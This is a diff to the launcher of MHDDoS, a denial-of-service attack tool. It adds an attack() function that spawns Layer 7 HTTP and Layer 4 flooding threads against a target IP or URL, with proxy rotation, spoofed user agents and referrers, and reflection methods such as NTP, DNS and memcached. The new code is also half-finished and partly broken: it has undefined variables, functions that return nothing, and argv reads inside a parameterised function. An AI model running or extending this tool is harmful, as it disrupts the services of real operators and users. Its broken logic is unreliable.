@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 import os
 from contextlib import suppress
 from json import load
@@ -11,7 +10,9 @@ from threading import Event, Thread
 from time import sleep, time, perf_counter
 from typing import List, Union
 
-from PyRoxy import Tools as ProxyTools
+import requests
+import validators
+from PyRoxy import Tools as ProxyTools, Proxy, ProxyType
 from icmplib import Host
 from requests import Response
 from yarl import URL
@@ -43,14 +44,218 @@ def exit(*message):
     _exit(1)
 
 
-# counters
-REQUESTS_SENT = Counter()
-BYTES_SENT = Counter()
-TOTAL_REQUESTS_SENT = Counter()
-TOTAL_BYTES_SENT = Counter()
+# def load(
+#         proxies_file_path: str,
+#         useragents_file_path: str,
+#         referrers_file_path: str
+# ):
+#     # TODO: load all this stuff
+#     pass
+
+
+def load_proxies(proxies_file_path: str, proxy_type: ProxyType = ProxyType.SOCKS5) -> List[Proxy]:
+    if validators.url(proxies_file_path):
+        # TODO: download file if it's a URL
+        pass
+
+    # look for this file in
+    proxy_path_relative = proxies_file_path
+    proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
+    if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
+        proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)
+
+    proxies = ProxyManager.loadProxyList(proxies_config, proxy_file_path, proxy_type)
+    proxies = ProxyManager.validateProxyList(proxies, ip, int(url.port), attack_method, target_address)
+
+
+def load_user_agents(user_agents_file_path: str) -> List[str]:
+    if validators.url(proxies_file_path):
+        # TODO: download file if it's a URL
+        pass
+
+    # look for this file in
+
+    # look for this file in default MHDDoS folder
+    useragent_file_path = Path(__dir__ / "files/useragent.txt")
+    if not useragent_file_path.exists():
+        exit("The Useragent file doesn't exist ")
+    uagents = set(a.strip()
+                  for a in useragent_file_path.open("r+").readlines())
+    if not uagents:
+        exit("Empty Useragent File ")
+
+
+def attack(
+    attack_method: str,
+    target_address: str,  # URL or IP
+    target_port: int,
+    proxies_file_path: str,
+    user_agents_file_path: str,
+    referrers_file_path: str
+):
+    attack_threads: List[Thread] = []
+
+    proxies_config = []  # TODO: we WILL load proxies here
+    with open(__dir__ / "config.json") as f:
+        proxies_config = load(f)
+
+    # SANITY CHECKS
+    # check attack method
+    if attack_method not in Methods.ALL_METHODS:
+        exit(f"Provided method ('{attack_method}') not found. Available methods: {', '.join(Methods.ALL_METHODS)}")
+    # check if address is IPv4 or URL
+    is_ip = validators.ipv4(target_address)
+    is_url = False
+    if not is_ip:
+        target_address = Tools.ensure_http_present(target_address)
+        is_url = validators.url(target_address)
+    if not is_ip and not is_url:
+        exit(f"Provided target address ('{target_address}') is neither a valid IPv4 nor a URL. Please provide a valid target address next time.")
+
+    # counters
+    REQUESTS_SENT = Counter()
+    BYTES_SENT = Counter()
+    TOTAL_REQUESTS_SENT = Counter()
+    TOTAL_BYTES_SENT = Counter()
+
+    if attack_method in Methods.LAYER7_METHODS:
+
+        # HANDLE PARAMETERS
+        url = URL(target_address)
+        host = url.host
+        try:
+            host = gethostbyname(url.host)
+        except Exception as e:
+            exit('Cannot resolve hostname ', url.host, e)
+        ip = Tools.get_ip(target_address)
+        # print(f"IP: {ip}")
+        # print(f"Port: {url.port}")
+        threads = int(argv[4])
+        rpc = int(argv[6])
+        timer = int(argv[7])
+
+        # HANDLE PROXIES
+        proxy_type = int(argv[3].strip())
+        proxy_path_relative = argv[5].strip()
+        proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
+        if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
+            proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)
+
+        proxies = ProxyManager.loadProxyList(proxies_config, proxy_file_path, proxy_type)
+        proxies = ProxyManager.validateProxyList(proxies, ip, int(url.port), attack_method, target_address)
+
+        # HANDLE BOMBARDIER
+        global bombardier_path
+        bombardier_path = Path(__dir__ / "go/bin/bombardier")
+        if attack_method == "BOMB":
+            assert (
+                    bombardier_path.exists()
+                    or bombardier_path.with_suffix('.exe').exists()
+            ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-attack_method"
+
+        if len(argv) == 9:
+            logger.setLevel("DEBUG")
+
+        # HANDLE USERAGENTS
+        useragent_file_path = Path(__dir__ / "files/useragent.txt")
+        if not useragent_file_path.exists():
+            exit("The Useragent file doesn't exist ")
+        uagents = set(a.strip()
+                      for a in useragent_file_path.open("r+").readlines())
+        if not uagents: exit("Empty Useragent File ")
+
+        # HANDLE REFERRERS
+        referrers_file_path = Path(__dir__ / "files/referers.txt")
+        if not referrers_file_path.exists():
+            exit("The Referer file doesn't exist ")
+        referers = set(a.strip()
+                       for a in referrers_file_path.open("r+").readlines())
+        if not referers: exit("Empty Referer File ")
+
+        if threads > 1000:
+            logger.warning("Number of threads is higher than 1000")
+        if rpc > 100:
+            logger.warning("RPC (Requests Per Connection) number is higher than 100")
+
+        # TODO: manage threads actively
+        for _ in range(threads):
+            Layer7(url, host, attack_method, rpc, event, uagents, referers, proxies, BYTES_SENT, REQUESTS_SENT).start()
+
+    if attack_method in Methods.LAYER4_METHODS:
+        # HANDLE PARAMETERS
+        url = URL(target_address)
+        port = url.port
+        host = url.host
+
+        try:
+            host = gethostbyname(host)
+        except Exception as e:
+            exit('Cannot resolve hostname ', url.host, e)
+
+        if port > 65535 or port < 1:
+            exit("Invalid Port [Min: 1 / Max: 65535] ")
+
+        RAW_SOCKET_METHODS = {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"}
+        if attack_method in RAW_SOCKET_METHODS \
+                and not Tools.checkRawSocket():
+            exit("Cannot Create Raw Socket")
+
+        threads = int(argv[3])
+        timer = int(argv[4])
+        proxies = None
+        referrers = None
+        if not port:
+            logger.warning("Port Not Selected, Set To Default: 80")
+            port = 80
+
+        if len(argv) >= 6:
+            argfive = argv[5].strip()
+            if argfive:
+                referrers_file_path = Path(__dir__ / "files" / argfive)
+                if attack_method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
+                    if not referrers_file_path.exists():
+                        exit("The reflector file doesn't exist")
+                    if len(argv) == 7:
+                        logger.setLevel("DEBUG")
+                        referrers = set(a.strip() for a in ProxyTools.Patterns.IP.findall(referrers_file_path.open("r+").read()))
+                    if not referrers:
+                        exit("Empty Reflector File ")
+
+                elif argfive.isdigit() and len(argv) >= 7:
+                    if len(argv) == 8:
+                        logger.setLevel("DEBUG")
+                    proxy_type = int(argfive)
+                    proxy_path_relative = argv[6].strip()
+                    proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
+                    if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
+                        proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)
+                    proxies = ProxyManager.loadProxyList(proxies_config, proxy_file_path, proxy_type)
+                    proxies = ProxyManager.validateProxyList(proxies, ip, port, attack_method, target_address)
+                    if attack_method not in {"MINECRAFT", "MCBOT", "TCP"}:
+                        exit("this attack_method cannot use for layer4 proxy")
+
+                else:
+                    logger.setLevel("DEBUG")
+
+        for _ in range(threads):
+            Layer4((host, port), referrers, attack_method, event, proxies, BYTES_SENT, REQUESTS_SENT).start()
+    
+    # TODO: input parameters
+    # TODO: launch a lot of threads according to the given methods
+    # TODO: loop:
+    #       - check CPU utilization
+    #       - decrease/increase threads
+    #       - each thread gets it's own proxy?
+    pass
 
 
 def start():
+    # COUNTERS
+    REQUESTS_SENT = Counter()
+    BYTES_SENT = Counter()
+    TOTAL_REQUESTS_SENT = Counter()
+    TOTAL_BYTES_SENT = Counter()
+
     with open(__dir__ / "config.json") as f:
         config = load(f)
         with suppress(IndexError):
@@ -80,6 +285,8 @@ def start():
                      ", ".join(Methods.ALL_METHODS))
 
             if method in Methods.LAYER7_METHODS:
+
+                # HANDLE PARAMETERS
                 url = URL(urlraw)
                 host = url.host
                 try:
@@ -92,16 +299,20 @@ def start():
                 threads = int(argv[4])
                 rpc = int(argv[6])
                 timer = int(argv[7])
+
+                # HANDLE PROXIES
                 proxy_type = int(argv[3].strip())
                 proxy_path_relative = argv[5].strip()
                 proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
                 if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
                     proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)
-                useragent_file_path = Path(__dir__ / "files/useragent.txt")
-                referrers_file_path = Path(__dir__ / "files/referers.txt")
+
+                proxies = ProxyManager.loadProxyList(config, proxy_file_path, proxy_type)
+                proxies = ProxyManager.validateProxyList(proxies, ip, int(url.port), method, urlraw)
+
+                # HANDLE BOMBARDIER
                 global bombardier_path
                 bombardier_path = Path(__dir__ / "go/bin/bombardier")
-
                 if method == "BOMB":
                     assert (
                             bombardier_path.exists()
@@ -111,17 +322,20 @@ def start():
                 if len(argv) == 9:
                     logger.setLevel("DEBUG")
 
+                # HANDLE USERAGENTS
+                useragent_file_path = Path(__dir__ / "files/useragent.txt")
                 if not useragent_file_path.exists():
                     exit("The Useragent file doesn't exist ")
-                if not referrers_file_path.exists():
-                    exit("The Referer file doesn't exist ")
-
                 uagents = set(a.strip()
                               for a in useragent_file_path.open("r+").readlines())
+                if not uagents: exit("Empty Useragent File ")
+
+                # HANDLE REFERRERS
+                referrers_file_path = Path(__dir__ / "files/referers.txt")
+                if not referrers_file_path.exists():
+                    exit("The Referer file doesn't exist ")
                 referers = set(a.strip()
                                for a in referrers_file_path.open("r+").readlines())
-
-                if not uagents: exit("Empty Useragent File ")
                 if not referers: exit("Empty Referer File ")
 
                 if threads > 1000:
@@ -129,14 +343,13 @@ def start():
                 if rpc > 100:
                     logger.warning("RPC (Requests Per Connection) number is higher than 100")
 
-                proxies = ProxyManager.loadProxyList(config, proxy_file_path, proxy_type)
-                proxies = ProxyManager.validateProxyList(proxies, ip, int(url.port), method, urlraw)
+                # TODO: manage threads actively
                 for _ in range(threads):
-                    Layer7(url, host, method, rpc, event, uagents, referers, proxies).start()
+                    Layer7(url, host, method, rpc, event, uagents, referers, proxies, BYTES_SENT, REQUESTS_SENT).start()
 
             if method in Methods.LAYER4_METHODS:
+                # HANDLE PARAMETERS
                 url = URL(urlraw)
-
                 port = url.port
                 host = url.host
 
@@ -190,7 +403,7 @@ def start():
                             logger.setLevel("DEBUG")
 
                 for _ in range(threads):
-                    Layer4((host, port), referrers, method, event, proxies).start()
+                    Layer4((host, port), referrers, method, event, proxies, BYTES_SENT, REQUESTS_SENT).start()
 
             # start health check thread
             if not port:
@@ -212,16 +425,21 @@ def start():
             event.set()
             ts = time()
 
-            global BYTES_SENT, REQUESTS_SENT, TOTAL_REQUESTS_SENT, TOTAL_BYTES_SENT
-
             while time() < ts + timer:
-                log_attack_status()
+                # log_attack_status()
 
                 # update request counts
                 TOTAL_REQUESTS_SENT += int(REQUESTS_SENT)
                 TOTAL_BYTES_SENT += int(BYTES_SENT)
                 REQUESTS_SENT.set(0)
                 BYTES_SENT.set(0)
+
+                # craft the status log message
+                pps = Tools.humanformat(int(REQUESTS_SENT))
+                bps = Tools.humanbytes(int(BYTES_SENT))
+                tp = Tools.humanformat(int(TOTAL_REQUESTS_SENT))
+                tb = Tools.humanbytes(int(TOTAL_BYTES_SENT))
+                logger.info(f"Total bytes sent: {tb}, total requests: {tp}")
 
                 sleep(1)
 
@@ -273,7 +491,7 @@ def target_health_check_loop(interval: float,
 status_logging_started = False
 
 
-def log_attack_status():
+def log_attack_status_new():
     global BYTES_SENT, REQUESTS_SENT, TOTAL_BYTES_SENT, TOTAL_REQUESTS_SENT, status_logging_started
 
     # craft status message
